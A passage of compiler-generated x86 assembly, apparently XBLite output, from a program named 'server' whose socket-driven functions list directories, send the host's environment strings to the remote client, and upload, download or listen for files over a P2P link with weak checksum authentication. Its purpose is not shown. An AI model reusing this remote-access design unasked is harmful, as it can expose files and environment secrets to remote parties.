;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody38.server:
;
; [2106] STRING text,buffer
#ifdef ClientTree.text
#undef ClientTree.text
#endif
#define ClientTree.text ebp-40	; exposes local variable 'text'
;
#ifdef ClientTree.buffer
#undef ClientTree.buffer
#endif
#define ClientTree.buffer ebp-44	; exposes local variable 'buffer'
;
;
; [2108] IF WaitForSingleObject (#hsmTree,10000) == $$WAIT_TIMEOUT THEN
	push	10000			;;; i656a
	push	[%#hsmTree.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.00D0.server			;;; i219
;
; [2109] SendMsg (socket,"CMSG --- can not acquire tree, previous operation in progress")
	mov	eax,addr @_string.044D.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2110] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func38.server			;;; i258
;
; [2111] END IF
else.00D0.server:
end.if.00D0.server:
;
; [2113] IF dir THEN
	mov	eax,[ebp+16]			;;; i665
	test	eax,eax			;;; i214
	jz	>> else.00D1.server			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00D1.server			;;; i218
;
; [2114] 'SendMsg (socket,"CMSG --- tree: "+dir)
;
; [2115] GetAllFilesInDir (socket,msg,dir)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk38.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[ebp+16]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func74.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [2116] 'SendMsg (socket,"CMSG --- end of tree: "+dir+"\1\2")
;
; [2117] ELSE
	jmp	end.if.00D1.server			;;; i107
else.00D1.server:
;
; [2118] SendMsg (socket,"CMSG * can not acquire tree: "+dir)
	mov	eax,addr @_string.044E.server			;;; i663
	mov	ebx,[ebp+16]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2119] END IF
end.if.00D1.server:
;
; [2121] ReleaseSemaphore (#hsmTree,1,NULL)
#ifdef ClientTree.NULL
#undef ClientTree.NULL
#endif
#define ClientTree.NULL ebp-56	; exposes local variable 'NULL'
;
	push	[ebp-56]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmTree.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2122] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientTree.server:  ;;; Function end label for Assembly Programmers.
end.func38.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func38.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func38.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientTree ()  *****
;  *****
;
; [2124] FUNCTION ClientGetEnv (socket)
.code
;
#ifdef ClientGetEnv.socket
#undef ClientGetEnv.socket
#endif
#define ClientGetEnv.socket ebp+8	; exposes function argument 'socket'
;
align 16
_ClientGetEnv.server@4:
;  *****
;  *****  FUNCTION  ClientGetEnv ()  *****
;  *****
func37.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody37.server:
;
; [2126] SendMsg (socket,"CMSG \1\2--- environment strings ---")
	mov	eax,addr @_string.0451.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2127] SendMsg (socket,"CMSG "+GetEnvStrings())
	call	func18.server			;;; i619
	mov	ebx,addr @_string.0452.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2128] SendMsg (socket,"CMSG --- environment strings end ---")
	mov	eax,addr @_string.0453.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2129] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientGetEnv.server:  ;;; Function end label for Assembly Programmers.
end.func37.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientGetEnv ()  *****
;  *****
;
; [2131] FUNCTION ClientUpload (STRING text)
.code
;
#ifdef ClientUpload.text
#undef ClientUpload.text
#endif
#define ClientUpload.text ebp+8	; exposes function argument 'text'
;
align 16
_ClientUpload.server@4:
;  *****
;  *****  FUNCTION  ClientUpload ()  *****
;  *****
func35.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func35.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.302:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.302			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,144			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,34				;;; ..
	xor	eax,eax			;;; ...
A.303:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.303			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+540]			;;; i125a
	lea	ecx,[esp+568]			;;; i125b
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-84],ecx			;;; i670
funcBody35.server:
;
; [2132] TP2PFILE file
; .composites = ebp-40	; internal variable
#ifdef ClientUpload.file
#undef ClientUpload.file
#endif
#define ClientUpload.file ebp-44	; exposes local variable 'file'
;
;
; [2133] TP2P p2p
#ifdef ClientUpload.p2p
#undef ClientUpload.p2p
#endif
#define ClientUpload.p2p ebp-48	; exposes local variable 'p2p'
;
;
; [2136] IF WaitForSingleObject (#hsmUpL,300000) == $$WAIT_TIMEOUT THEN
	push	300000			;;; i656a
	push	[%#hsmUpL.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.00D2.server			;;; i219
;
; [2137] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func35.server			;;; i258
;
; [2138] END IF
else.00D2.server:
end.if.00D2.server:
;
; [2140] IF newP2P(@p2p) THEN
;
; [0] EXTERNAL FUNCTION newP2P (TP2P)
	mov	eax,d[ebp-48]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00D3.server			;;; i221
;
; [2141] auths$ = GetTokenEx (@text,',',0)
#ifdef ClientUpload.auths$
#undef ClientUpload.auths$
#endif
#define ClientUpload.auths$ ebp-52	; exposes local variable 'auths$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2142] addr$ = GetTokenEx (@text,',',0)
#ifdef ClientUpload.addr$
#undef ClientUpload.addr$
#endif
#define ClientUpload.addr$ ebp-56	; exposes local variable 'addr$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2143] port = ULONG(GetTokenEx (@text,',',0))
#ifdef ClientUpload.port
#undef ClientUpload.port
#endif
#define ClientUpload.port ebp-60	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-60],eax			;;; i670
;
; [2144] file.auth = @p2p.GetAdler(&auths$,LEN(auths$))
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.297			;;; i604
; .xstk35.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i642
; .xstk35.0001 = ebp-76	; internal variable
	mov	d[ebp-76],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.298			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.298:
	push	eax			;;; i667a
	push	[ebp-76]			;;; i674a
	mov	eax,d[ebp-68]			;;; i665
	call	eax			;;; i620
A.297:
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+3],eax			;;; i13b
;
; [2145] file.srcfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+7]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [2146] file.desfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+262]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [2147] file.start = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+517],eax			;;; i13b
;
; [2148] file.end = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+521],eax			;;; i13b
;
; [2149] file.flags = ULONG(GetTokenEx (@text,0,0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	b[ebx+538],al			;;; i13b
;
; [2150] file.blocks = 0'use default block size
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+533],ebx			;;; i13b
;
; [2152] ret = @p2p.FileUpload (file,addr$,port)
#ifdef ClientUpload.ret
#undef ClientUpload.ret
#endif
#define ClientUpload.ret ebp-80	; exposes local variable 'ret'
;
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.299			;;; i604
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
; .compositeArg.0 = ebp-84	; internal variable
	mov	edi,d[ebp-84]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,540			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	mov	d[ebp-76],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk35.0002 = ebp-92	; internal variable
	mov	d[ebp-92],eax			;;; i670
	push	[ebp-60]			;;; i674a
	push	[ebp-92]			;;; i674a
	push	[ebp-76]			;;; i674a
	mov	eax,d[ebp-68]			;;; i665
	call	eax			;;; i620
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
A.299:
	mov	d[ebp-80],eax			;;; i670
;
; [2153] '@p2p.Free(p2p)
;
; [2154] ELSE
	jmp	end.if.00D3.server			;;; i107
else.00D3.server:
;
; [2155] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-80],eax			;;; i670
;
; [2156] END IF
end.if.00D3.server:
;
; [2158] ReleaseSemaphore (#hsmUpL,1,NULL)
#ifdef ClientUpload.NULL
#undef ClientUpload.NULL
#endif
#define ClientUpload.NULL ebp-96	; exposes local variable 'NULL'
;
	push	[ebp-96]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmUpL.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2159] RETURN ret
	mov	eax,d[ebp-80]			;;; i665
	jmp	end.func35.server			;;; i258
;
; [2160] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientUpload.server:  ;;; Function end label for Assembly Programmers.
end.func35.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func35.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func35.server:
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientUpload ()  *****
;  *****
;
; [2162] FUNCTION ClientListen (socket,STRING text)
.code
;
#ifdef ClientListen.socket
#undef ClientListen.socket
#endif
#define ClientListen.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientListen.text
#undef ClientListen.text
#endif
#define ClientListen.text ebp+12	; exposes function argument 'text'
;
align 16
_ClientListen.server@8:
;  *****
;  *****  FUNCTION  ClientListen ()  *****
;  *****
func36.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.307:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.307			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody36.server:
;
; [2163] STATIC TLP2P p2p[]
data section 'globals$statics'
align	4
%%36%%p2p.server:	db 4 dup ?
.code
;
; [2164] STATIC ONCE,i
data section 'globals$statics'
align	4
%36%ONCE.server:	db 4 dup ?
.code
data section 'globals$statics'
align	4
%36%i.server:	db 4 dup ?
.code
;
; [2165] TP2P p
; .composites = ebp-40	; internal variable
#ifdef ClientListen.p
#undef ClientListen.p
#endif
#define ClientListen.p ebp-44	; exposes local variable 'p'
;
;
; [2168] '	SendMsg (socket,"CMSG *** server listen start")
;
; [2169] IF WaitForSingleObject (#hsmListen,30000) == $$WAIT_TIMEOUT THEN
	push	30000			;;; i656a
	push	[%#hsmListen.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.00D4.server			;;; i219
;
; [2170] SendMsg (socket,"CMSG *** server listen timeout")
	mov	eax,addr @_string.046D.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2171] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func36.server			;;; i258
;
; [2172] END IF
else.00D4.server:
end.if.00D4.server:
;
; [2174] IFZ ONCE THEN
	mov	eax,d[%36%ONCE.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00D5.server			;;; i195
;
; [2175] ONCE = 1
	mov	eax,1			;;; i659
	mov	d[%36%ONCE.server],eax			;;; i668
;
; [2176] DIM p2p[100]
	sub	esp,64			;;; i430
	mov	eax,100			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%36%%p2p.server]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1048772568			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%36%%p2p.server],eax			;;; i668
;
; [2177] i = 0
	mov	eax,0			;;; i659
	mov	d[%36%i.server],eax			;;; i668
;
; [2178] ELSE
	jmp	end.if.00D5.server			;;; i107
else.00D5.server:
;
; [2179] INC i: IF (i == 101) THEN i = 0
	inc	d[%36%i.server]			;;; i85
	mov	eax,d[%36%i.server]			;;; i663a
	cmp	eax,101			;;; i684a
	jne	>> else.00D6.server			;;; i219
	mov	eax,0			;;; i659
	mov	d[%36%i.server],eax			;;; i668
else.00D6.server:
end.if.00D6.server:
;
; [2180] END IF
end.if.00D5.server:
;
; [2182] IFZ newP2P(@p) THEN
	mov	eax,d[ebp-44]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.00D7.server			;;; i195
;
; [2183] ReleaseSemaphore (#hsmListen,1,NULL)
#ifdef ClientListen.NULL
#undef ClientListen.NULL
#endif
#define ClientListen.NULL ebp-48	; exposes local variable 'NULL'
;
	push	[ebp-48]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmListen.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2184] SendMsg (socket,"CMSG *** newP2P() fault")
	mov	eax,addr @_string.046F.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2185] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func36.server			;;; i258
;
; [2186] ELSE
	jmp	end.if.00D7.server			;;; i107
else.00D7.server:
;
; [2187] p2p[i].fs = p
	mov	eax,d[%36%i.server]			;;; i663a
	mov	edx,d[%%36%%p2p.server]			;;; i663a
	imul	eax,40			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[ebp-44]			;;; i665
	mov	edi,eax			;;; i14a
	mov	esi,ebx			;;; i7
	mov	ecx,28			;;; i1
	call	%_AssignComposite			;;; i2
;
; [2188] END IF
end.if.00D7.server:
;
; [2190] p2p[i].auth = XLONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[%36%i.server]			;;; i663a
	mov	ecx,d[%%36%%p2p.server]			;;; i663a
	imul	ebx,40			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	d[ebx+28],eax			;;; i13b
;
; [2191] p2p[i].port = ULONG(GetTokenEx (@text,0,0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[%36%i.server]			;;; i663a
	mov	ecx,d[%%36%%p2p.server]			;;; i663a
	imul	ebx,40			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	d[ebx+32],eax			;;; i13b
;
; [2192] p2p[i].ret = @p2p[i].fs.FileListen (p2p[i].auth,p2p[i].port)
	mov	eax,d[%36%i.server]			;;; i663a
	mov	edx,d[%%36%%p2p.server]			;;; i663a
	imul	eax,40			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.304			;;; i604
; .xstk36.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%36%i.server]			;;; i663a
	mov	edx,d[%%36%%p2p.server]			;;; i663a
	imul	eax,40			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+28]			;;; i313b
; .xstk36.0001 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[%36%i.server]			;;; i663a
	mov	edx,d[%%36%%p2p.server]			;;; i663a
	imul	eax,40			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+32]			;;; i313b
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	mov	eax,d[ebp-56]			;;; i665
	call	eax			;;; i620
A.304:
	mov	ebx,d[%36%i.server]			;;; i663a
	mov	ecx,d[%%36%%p2p.server]			;;; i663a
	imul	ebx,40			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	d[ebx+36],eax			;;; i13b
;
; [2194] '	SendMsg (socket,"CMSG *** free... "+STRING$(i))
;
; [2195] '@p2p[i].fs.Free(p2p[i].fs)
;
; [2196] '	SendMsg (socket,"CMSG *** freed: "+STRING$(p2p[i].ret)+" "+STRING$(p2p[i].fs.index))
;
; [2198] IF (p2p[i].ret == -2) THEN
	mov	eax,d[%36%i.server]			;;; i663a
	mov	edx,d[%%36%%p2p.server]			;;; i663a
	imul	eax,40			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+36]			;;; i313b
	mov	ebx,2			;;; i659
	neg	ebx			;;; i916
	cmp	eax,ebx			;;; i684a
	jne	>> else.00D8.server			;;; i219
;
; [2199] SendMsg (socket,"CMSG *** can not bind remote socket to port "+STRING$(p2p[i].port))
	sub	esp,64			;;; i487
	mov	eax,d[%36%i.server]			;;; i663a
	mov	edx,d[%%36%%p2p.server]			;;; i663a
	imul	eax,40			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+32]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0471.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2200] END IF
else.00D8.server:
end.if.00D8.server:
;
; [2202] ReleaseSemaphore (#hsmListen,1,NULL)
	push	[ebp-48]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmListen.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2203] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientListen.server:  ;;; Function end label for Assembly Programmers.
end.func36.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientListen ()  *****
;  *****
;
; [2205] FUNCTION ClientDownload (STRING text)
.code
;
#ifdef ClientDownload.text
#undef ClientDownload.text
#endif
#define ClientDownload.text ebp+8	; exposes function argument 'text'
;
align 16
_ClientDownload.server@4:
;  *****
;  *****  FUNCTION  ClientDownload ()  *****
;  *****
func34.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func34.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.315:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.315			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,140			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,35				;;; ..
	xor	eax,eax			;;; ...
A.316:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.316			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+540]			;;; i125a
	lea	ecx,[esp+568]			;;; i125b
	lea	edx,[esp+1108]			;;; i125c
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-84],ecx			;;; i670
	mov	d[ebp-96],edx			;;; i670
funcBody34.server:
;
; [2206] TP2PFILE file
; .composites = ebp-40	; internal variable
